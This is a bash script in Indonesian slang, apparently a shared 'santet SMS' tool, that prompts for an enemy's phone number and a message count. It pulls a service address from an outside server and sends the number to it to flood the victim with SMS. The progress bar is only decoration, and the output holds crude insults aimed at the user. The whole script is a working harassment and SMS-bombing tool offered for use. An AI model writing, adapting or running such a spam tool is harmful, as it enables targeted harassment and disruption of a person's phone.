#!/bin/bash
echo Selamat datang tod, Siapa nama lu? #tulisan keluar
read nick #membaca yang ditulis
sleep 0.03
echo "      _.-^^---....,,-- "
sleep 0.03
echo "  _--     jika ada       --_ "
sleep 0.03
echo " <         kendala        >) "
sleep 0.03
echo " |         hubungi         | "
sleep 0.03
echo "  \._    fb: lilung     _./ "
sleep 0.03
echo "     '''--. . , ; .--'''    " 
sleep 0.03
echo "           | |   |           "
sleep 0.03
echo "        .-=||  | |=-.    "
sleep 0.03
echo "        '-=#$%&%$#=-'    "
sleep 0.03
echo "           | ;  :|      "
sleep 0.03
echo "  _____.,-#%&$@%#&#~,._____ "
sleep 0.03
echo "============================="
sleep 2
echo "==   Tool santet sms by lilung  =="
sleep 0.3
echo "==   youtube: lilung project   =="
sleep 0.7
echo "============================="
echo Selamat datang $nick ":)"
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
if [[ $response = *sleeping* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo "Silahkan masukan nomor hp musuh klean "
    echo contoh 0812345678
    read target # masukin no telp
    echo
    echo "Berapa santet yang mau dikirim?"
    read paket
    echo
    echo Apakah nomor $target "dan SANTET dikirim "$paket" sudah benar?"
    echo y/n?
    read confirm
    echo
    if [ $confirm = "y" ]; then
        echo Melakukan spam SMS ke nomor $target
        i=0
        max=100
        while [ $i -le $max ]; do
        echo -ne "\nSpamming percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
            echo "Jangan close dulu aplikasi tod sebelum spam selesai buru buru amat lu emang mau coli"            
            echo "========================================"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket


            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            echo " selamat anda jadi hackel plo"
            echo
            echo " udah selesai goblok "
            echo " -lilung"
            echo "======================================="
            fi
            let i++
            done
    else
        echo "ada Kesalahan goblok"
    fi
fi
